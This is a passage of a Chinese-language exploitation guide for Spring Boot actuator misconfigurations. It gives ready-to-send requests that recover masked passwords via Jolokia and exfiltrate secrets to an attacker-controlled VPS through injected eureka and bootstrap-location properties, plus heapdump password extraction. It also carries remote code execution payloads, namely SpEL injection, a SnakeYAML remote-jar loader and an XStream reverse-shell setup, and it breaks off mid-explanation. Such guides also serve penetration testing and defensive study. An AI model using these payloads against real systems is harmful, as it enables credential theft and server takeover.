      <td>spring-boot-starter-parent</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
    </tr>
    <tr>
      <td>spring-boot-dependencies</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
    </tr>
    <tr>
      <td>spring-cloud-dependencies</td>
      <td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
    </tr>
  </tbody>
</table>

<h4 id="spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</h4>

<table>
  <thead>
    <tr>
      <th>Spring Cloud</th>
      <th>Spring Boot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Angel</td>
      <td>兼容 Spring Boot 1.2.x</td>
    </tr>
    <tr>
      <td>Brixton</td>
      <td>兼容 Spring Boot 1.3.x、1.4.x</td>
    </tr>
    <tr>
      <td>Camden</td>
      <td>兼容 Spring Boot 1.4.x、1.5.x</td>
    </tr>
    <tr>
      <td>Dalston</td>
      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
    </tr>
    <tr>
      <td>Edgware</td>
      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
    </tr>
    <tr>
      <td>Finchley</td>
      <td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
    </tr>
    <tr>
      <td>Greenwich</td>
      <td>兼容 Spring Boot 2.1.x</td>
    </tr>
    <tr>
      <td>Hoxton</td>
      <td>兼容 Spring Boot 2.2.x</td>
    </tr>
  </tbody>
</table>

<h4 id="spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</h4>

<table>
  <thead>
    <tr>
      <th>版本号后缀</th>
      <th>含义</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>BUILD-SNAPSHOT</td>
      <td>快照版，代码不是固定，处于变化之中</td>
    </tr>
    <tr>
      <td>MX</td>
      <td>里程碑版</td>
    </tr>
    <tr>
      <td>RCX</td>
      <td>候选发布版</td>
    </tr>
    <tr>
      <td>RELEASE</td>
      <td>正式发布版</td>
    </tr>
    <tr>
      <td>SRX</td>
      <td>(修复错误和 bug 并再次发布的)正式发布版</td>
    </tr>
  </tbody>
</table>

<h2 id="一信息泄露">一：信息泄露</h2>

<h3 id="0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</h3>

<blockquote>
  <p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
</blockquote>

<p>直接访问以下几个路由，验证漏洞是否存在：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api-docs
/v2/api-docs
/swagger-ui.html
</code></pre></div></div>

<p>一些可能会遇到的接口路由变形：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
</code></pre></div></div>

<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
</code></pre></div></div>

<p><strong>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>；</p>

<p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p>

<h3 id="0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</h3>

<blockquote>
  <p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
</blockquote>

<p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
</code></pre></div></div>

<p>其中对寻找漏洞比较重要接口的有：</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/env</code>、<code class="language-plaintext highlighter-rouge">/actuator/env</code></p>

    <p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；</p>

    <p>同时有一定概率可以通过 POST 请求 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置一些属性，触发相关 RCE 漏洞。</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/jolokia</code></p>

    <p>通过 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">/trace</code></p>

    <p>一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息</p>
  </li>
</ul>

<h3 id="0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>

<h4 id="利用方法">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-jolokia-调用相关-mbean-获取明文">步骤二： jolokia 调用相关 Mbean 获取明文</h5>

<p>将下面示例中的 <code class="language-plaintext highlighter-rouge">security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code class="language-plaintext highlighter-rouge">value</code> 键中。</p>

<ul>
  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.boot</code> Mbean（<strong>可能更通用</strong>）</li>
</ul>

<blockquote>
  <p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<ul>
  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.cloud.context.environment</code> Mbean（<strong>需要 spring cloud 相关依赖</strong>）</li>
</ul>

<blockquote>
  <p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
</code></pre></div></div>

<h3 id="0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-1">利用条件：</h4>

<ul>
  <li>可以 GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-1">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名-1">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-使用-nc-监听-http-请求">步骤二： 使用 nc 监听 HTTP 请求</h5>

<p>在自己控制的外网服务器上监听 80 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
</code></pre></div></div>

<h5 id="步骤三-设置-eurekaclientserviceurldefaultzone-属性">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5>

<p>将下面 <code class="language-plaintext highlighter-rouge">http://value:${security.user.password}@your-vps-ip</code>  中的  <code class="language-plaintext highlighter-rouge">security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>

<p><code class="language-plaintext highlighter-rouge">your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
</code></pre></div></div>

<h5 id="步骤四-刷新配置">步骤四： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h5 id="步骤五-解码属性值">步骤五： 解码属性值</h5>

<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code class="language-plaintext highlighter-rouge">Authorization</code> 头内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Basic dmFsdWU6MTIzNDU2
</code></pre></div></div>

<p>将其中的 <code class="language-plaintext highlighter-rouge">dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code class="language-plaintext highlighter-rouge">value:123456</code>，其中的 <code class="language-plaintext highlighter-rouge">123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>

<h3 id="0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-2">利用条件：</h4>

<ul>
  <li>通过 POST <code class="language-plaintext highlighter-rouge">/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-2">利用方法：</h4>

<blockquote>
  <p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p>
</blockquote>

<h5 id="步骤一-找到想要获取的属性名-2">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-使用-nc-监听-http-请求-1">步骤二： 使用 nc 监听 HTTP 请求</h5>

<p>在自己控制的外网服务器上监听 80 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
</code></pre></div></div>

<h5 id="步骤三-触发对外-http-请求">步骤三： 触发对外 http 请求</h5>

<ul>
  <li><code class="language-plaintext highlighter-rouge">spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
</ul>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
</ul>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
</code></pre></div></div>

<h5 id="步骤四-刷新配置-1">步骤四： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h3 id="0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</h3>

<blockquote>
  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>

<h4 id="利用条件-3">利用条件：</h4>

<ul>
  <li>可正常 GET 请求目标 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口</li>
</ul>

<h4 id="利用方法-3">利用方法：</h4>

<h5 id="步骤一-找到想要获取的属性名-3">步骤一： 找到想要获取的属性名</h5>

<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>

<h5 id="步骤二-下载-jvm-heap-信息">步骤二： 下载 jvm heap 信息</h5>

<blockquote>
  <p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">GET</code> 请求目标的 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>

<h5 id="步骤三-使用-mat-获得-jvm-heap-中的密码明文">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5>

<p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 OQL 语句 <code class="language-plaintext highlighter-rouge">select * from org.springframework.web.context.support.StandardServletEnvironment</code>， 辅助快速过滤分析，获得密码明文</p>

<h2 id="二远程代码执行">二：远程代码执行</h2>

<blockquote>
  <p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p>
</blockquote>

<h3 id="0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</h3>

<h4 id="利用条件-4">利用条件：</h4>

<ul>
  <li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
  <li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>

<h4 id="利用方法-4">利用方法：</h4>

<h5 id="步骤一找到一个正常传参处">步骤一：找到一个正常传参处</h5>

<p>比如发现访问  <code class="language-plaintext highlighter-rouge">/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code class="language-plaintext highlighter-rouge">Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>

<h5 id="步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</h5>

<p>输入 <code class="language-plaintext highlighter-rouge">/article?id=${7*7}</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>

<p>由字符串格式转换成 <code class="language-plaintext highlighter-rouge">0x**</code> java 字节形式，方便执行任意代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># coding: utf-8
</span>
<span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">target</span> <span class="o">=</span> <span class="s">'open -a Calculator'</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">+</span> <span class="s">","</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">','</span><span class="p">))</span>
</code></pre></div></div>

<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]{</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x70</span><span class="o">,</span><span class="mh">0x65</span><span class="o">,</span><span class="mh">0x6e</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x2d</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x43</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x63</span><span class="o">,</span><span class="mh">0x75</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x74</span><span class="o">,</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x72</span><span class="o">}))}</span>
</code></pre></div></div>

<h4 id="漏洞原理">漏洞原理：</h4>

<ol>
  <li>spring boot 处理参数值出错，流程进入 <code class="language-plaintext highlighter-rouge">org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
  <li>此时 URL 中的参数值会用 <code class="language-plaintext highlighter-rouge">parseStringValue</code> 方法进行递归解析</li>
  <li>其中  <code class="language-plaintext highlighter-rouge">${}</code>  包围的内容都会被 <code class="language-plaintext highlighter-rouge">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code class="language-plaintext highlighter-rouge">resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析">漏洞分析：</h4>

<p>​	<a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>

<h4 id="漏洞环境">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository/springboot-spel-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9091/article?id=66
</code></pre></div></div>

<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">http:</span><span class="c1">//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}</span>
</code></pre></div></div>

<h3 id="0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</h3>

<h4 id="利用条件-5">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标依赖的 <code class="language-plaintext highlighter-rouge">spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-5">利用方法：</h4>

<h5 id="步骤一-托管-yml-和-jar-文件">步骤一： 托管 yml 和 jar 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">yml</code> 的文件  <code class="language-plaintext highlighter-rouge">example.yml</code>，内容如下：</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">!!javax.script.ScriptEngineManager</span> <span class="pi">[</span>
  <span class="kt">!!java.net.URLClassLoader</span> <span class="pi">[[</span>
    <span class="kt">!!java.net.URL</span> <span class="pi">[</span><span class="s2">"</span><span class="s">http://your-vps-ip/example.jar"</span><span class="pi">]</span>
  <span class="pi">]]</span>
<span class="pi">]</span>
</code></pre></div></div>

<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">jar</code> 的文件  <code class="language-plaintext highlighter-rouge">example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>

<h5 id="步骤二-设置-springcloudbootstraplocation-属性">步骤二： 设置 spring.cloud.bootstrap.location 属性</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
</code></pre></div></div>

<h5 id="步骤三-刷新配置">步骤三： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-1">漏洞原理：</h4>

<ol>
  <li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
  <li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
  <li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
  <li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
  <li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
  <li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-1">漏洞分析：</h4>

<p>​	<a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>

<h4 id="漏洞环境-1">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository/springcloud-snakeyaml-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9092/env
</code></pre></div></div>

<h3 id="0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</h3>

<h4 id="利用条件-6">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标使用的  <code class="language-plaintext highlighter-rouge">eureka-client</code> &lt; 1.8.7（通常包含在 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-6">利用方法：</h4>

<h5 id="步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</h5>

<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>

<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>

<h5 id="步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
</code></pre></div></div>

<h5 id="步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
</code></pre></div></div>

<h5 id="步骤四刷新配置">步骤四：刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-2">漏洞原理：</h4>

<ol>
  <li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
